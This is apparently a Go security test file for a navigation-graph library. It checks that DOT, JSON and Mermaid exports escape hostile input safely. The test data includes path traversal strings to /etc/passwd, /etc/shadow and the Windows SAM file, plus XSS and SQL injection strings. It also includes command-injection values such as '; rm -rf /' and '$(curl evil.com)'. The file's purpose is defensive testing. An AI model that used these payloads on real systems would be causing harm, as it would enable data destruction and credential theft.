// Copyright 2026 Milos Vasic. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

package graph

import (
	"strings"
	"testing"

	"digital.vasic.visionengine/pkg/analyzer"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestSecurity_PathTraversalInScreenID(t *testing.T) {
	g := NewNavigationGraph()
	maliciousIDs := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32",
		"/etc/shadow",
		"C:\\Windows\\System32\\config\\SAM",
		"screen/../../../sensitive",
	}

	for _, id := range maliciousIDs {
		s := analyzer.ScreenIdentity{
			ID:          id,
			Name:        "Malicious",
			Fingerprint: "fp-" + id,
		}
		addedID := g.AddScreen(s)
		assert.Equal(t, id, addedID, "Screen ID should be stored as-is (graph doesn't interpret file paths)")
	}
}

func TestSecurity_XSSInScreenName(t *testing.T) {
	g := NewNavigationGraph()
	g.AddScreen(analyzer.ScreenIdentity{
		ID:          "xss-screen",
		Name:        `<script>alert("xss")</script>`,
		Fingerprint: "fp-xss",
	})

	// DOT export: quotes inside the name should be escaped
	dot := ExportDOT(g)
	assert.Contains(t, dot, `alert(\"xss\")`)

	// JSON export should be valid and parseable
	jsonStr, err := ExportJSON(g)
	require.NoError(t, err)
	assert.Contains(t, jsonStr, "xss-screen")

	// Mermaid export: quotes should be replaced
	mermaid := ExportMermaid(g)
	assert.Contains(t, mermaid, "xss_screen")
	// Mermaid replaces double quotes with single quotes
	assert.NotContains(t, mermaid, `"xss"`)
}

func TestSecurity_SQLInjectionInNames(t *testing.T) {
	g := NewNavigationGraph()
	g.AddScreen(analyzer.ScreenIdentity{
		ID:          "sql-screen",
		Name:        `Robert'; DROP TABLE screens; --`,
		Fingerprint: "fp-sql",
	})

	// Graph is in-memory, no SQL, but verify exports don't break
	dot := ExportDOT(g)
	assert.Contains(t, dot, "Robert")

	_, err := ExportJSON(g)
	assert.NoError(t, err)

	mermaid := ExportMermaid(g)
	assert.Contains(t, mermaid, "Robert")
}

func TestSecurity_NullBytesInScreenID(t *testing.T) {
	g := NewNavigationGraph()
	g.AddScreen(analyzer.ScreenIdentity{
		ID:          "screen\x00null",
		Name:        "Null Screen",
		Fingerprint: "fp-null",
	})

	screens := g.Screens()
	assert.Len(t, screens, 1)
}

func TestSecurity_VeryLongScreenID(t *testing.T) {
	g := NewNavigationGraph()
	longID := strings.Repeat("a", 10000)
	g.AddScreen(analyzer.ScreenIdentity{
		ID:          longID,
		Name:        "Long ID Screen",
		Fingerprint: "fp-long",
	})

	screens := g.Screens()
	assert.Len(t, screens, 1)
	assert.Len(t, screens[0].ID, 10000)
}

func TestSecurity_VeryLongScreenName(t *testing.T) {
	g := NewNavigationGraph()
	longName := strings.Repeat("Screen ", 1000)
	g.AddScreen(analyzer.ScreenIdentity{
		ID:          "long-name-screen",
		Name:        longName,
		Fingerprint: "fp-longname",
	})

	// Export should handle long names
	dot := ExportDOT(g)
	assert.NotEmpty(t, dot)

	_, err := ExportJSON(g)
	assert.NoError(t, err)

	mermaid := ExportMermaid(g)
	assert.NotEmpty(t, mermaid)
}

func TestSecurity_UnicodeInScreenNames(t *testing.T) {
	g := NewNavigationGraph()
	unicodeScreens := []struct {
		id   string
		name string
	}{
		{"emoji", "Settings \U0001F527"},
		{"chinese", "\u8BBE\u7F6E\u9875\u9762"},
		{"arabic", "\u0625\u0639\u062F\u0627\u062F\u0627\u062A"},
		{"mixed", "Home \u2192 Settings \u2192 About"},
		{"rtl", "\u202Emalicious\u202C"},
		{"zerowidth", "scr\u200Been"},
	}

	for _, s := range unicodeScreens {
		g.AddScreen(analyzer.ScreenIdentity{
			ID:          s.id,
			Name:        s.name,
			Fingerprint: "fp-" + s.id,
		})
	}

	assert.Len(t, g.Screens(), len(unicodeScreens))

	// All export formats should handle unicode
	dot := ExportDOT(g)
	assert.NotEmpty(t, dot)

	jsonStr, err := ExportJSON(g)
	assert.NoError(t, err)
	assert.NotEmpty(t, jsonStr)

	mermaid := ExportMermaid(g)
	assert.NotEmpty(t, mermaid)
}

func TestSecurity_CommandInjectionInAction(t *testing.T) {
	g := NewNavigationGraph()
	g.AddScreen(makeScreen("a", "A", "test"))
	g.AddScreen(makeScreen("b", "B", "test"))

	// Action with shell metacharacters
	maliciousActions := []analyzer.Action{
		{Type: "click", Target: "; rm -rf /"},
		{Type: "click", Target: "$(curl evil.com)"},
		{Type: "click", Target: "`whoami`"},
		{Type: "click", Target: "| cat /etc/passwd"},
		{Type: "type", Value: "'; DROP TABLE users; --"},
	}

	for _, action := range maliciousActions {
		g.AddTransition("a", "b", action)
	}

	// Exports should not execute any of these
	dot := ExportDOT(g)
	assert.NotEmpty(t, dot)

	_, err := ExportJSON(g)
	assert.NoError(t, err)

	mermaid := ExportMermaid(g)
	assert.NotEmpty(t, mermaid)
}

func TestSecurity_MermaidSyntaxInjection(t *testing.T) {
	g := NewNavigationGraph()
	// Try to inject Mermaid directives
	g.AddScreen(analyzer.ScreenIdentity{
		ID:          "inject",
		Name:        "A[\"inject\"]-->B",
		Fingerprint: "fp-inject",
	})

	mermaid := ExportMermaid(g)
	// Brackets should be sanitized
	assert.NotContains(t, mermaid, `["inject"]`)
}

func TestSecurity_DOTSyntaxInjection(t *testing.T) {
	g := NewNavigationGraph()
	// Try to inject DOT directives
	g.AddScreen(analyzer.ScreenIdentity{
		ID:          "inject",
		Name:        `"]; malicious [label="attack`,
		Fingerprint: "fp-inject",
	})

	dot := ExportDOT(g)
	// Quotes should be escaped
	assert.Contains(t, dot, `\"`)
	// There should be exactly one node definition line for "inject"
	nodeLines := 0
	for _, line := range strings.Split(dot, "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, `"inject"`) && strings.Contains(trimmed, "[") {
			nodeLines++
		}
	}
	assert.Equal(t, 1, nodeLines, "Only one node definition should exist for 'inject'")
}

func TestSecurity_EmptyStringHandling(t *testing.T) {
	g := NewNavigationGraph()
	g.AddScreen(analyzer.ScreenIdentity{
		ID:          "",
		Name:        "",
		Fingerprint: "",
	})

	screens := g.Screens()
	assert.Len(t, screens, 1)

	// Exports should handle empty strings gracefully
	dot := ExportDOT(g)
	assert.NotEmpty(t, dot)

	_, err := ExportJSON(g)
	assert.NoError(t, err)

	mermaid := ExportMermaid(g)
	assert.NotEmpty(t, mermaid)
}
